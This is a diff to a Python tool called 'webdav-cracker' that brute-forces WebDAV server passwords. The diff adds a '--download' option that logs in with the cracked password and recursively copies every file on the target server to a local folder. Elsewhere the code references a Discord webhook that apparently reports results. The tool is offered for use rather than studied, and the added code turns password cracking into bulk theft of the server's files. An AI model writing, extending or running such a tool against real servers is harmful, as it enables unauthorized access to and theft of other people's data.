@@ -1,3 +1,6 @@
+#!/usr/bin/python3
+
+
 ##################################################################
 #                                                                #
 #                         webdav-cracker                         #
@@ -14,14 +17,25 @@ import argparse
 import base64
 import itertools
 import json
+import os
 import queue
 import string
 import threading
 import time
+import urllib.parse
 from typing import Tuple
 
 import cbor
 import requests
+from bs4 import BeautifulSoup
+
+
+# dir path
+def dir_path(string):
+    if os.path.isdir(string):
+        return string
+    else:
+        raise NotADirectoryError(string)
 
 
 parser = argparse.ArgumentParser(
@@ -85,6 +99,13 @@ parser.add_argument(
 )
 
 parser.add_argument(
+    "--download",
+    metavar="DOWNLOAD PATH",
+    type=dir_path,
+    help="After brute forcing the password, all files are downloaded to the specified folder"
+)
+
+parser.add_argument(
     "--start",
     metavar="START CHARACTERS",
     type=str,
@@ -119,17 +140,41 @@ args = parser.parse_args()
 # decode characters
 characters = base64.b64decode(args.b64_characters).decode()
 
-# get index directory path
-if args.url.endswith("/"):
-    url = f"{args.url}."
-else:
-    url = f"{args.url}/."
-
 # create WEBDAV session
 dav = requests.session()
 dav.headers = {
     "User-Agent": args.user_agent
 }
+
+
+def download_dir(path: str) -> None:
+    "Download a WEBDAV folder"
+
+    # download folder
+    r = dav.get(urllib.parse.urljoin(f"{args.url}/", path))
+    r.raise_for_status()
+
+    # parse 'a' tags from html
+    soup = BeautifulSoup(r.text, "html.parser")
+    for a in soup.find_all("a"):
+        href = a.get("href")
+
+        # ignore invalid urls
+        if href.startswith("?") or href.startswith("/"):
+            continue
+
+        # download subfolder
+        if href.endswith("/"):
+            os.mkdir(os.path.join(args.download, f"{path}{href}"))
+            download_dir(f"{path}{href}")
+            continue
+
+        # download file
+        r = dav.get(urllib.parse.urljoin(f"{args.url}/", path, href), stream=True)
+        r.raise_for_status()
+        with open(os.path.join(args.download, f"{path}{href}"), "wb") as f:
+            for chunk in r.iter_content(1048576):
+                f.write(chunk)
 
 
 class Discord:
@@ -245,7 +290,7 @@ class WEBDAV:
         # check for rights
         r = dav.request(
             "PROPFIND",
-            url,
+            args.url,
             headers={
                 "Depth": "1"
             },
@@ -314,5 +359,11 @@ if args.webhook is not None:
         ]
     })
 
+if args.download is not None:
+    dav.auth = (
+        args.username,
+        password
+    )
+    download_dir("")
 
 discord.tasks.join()
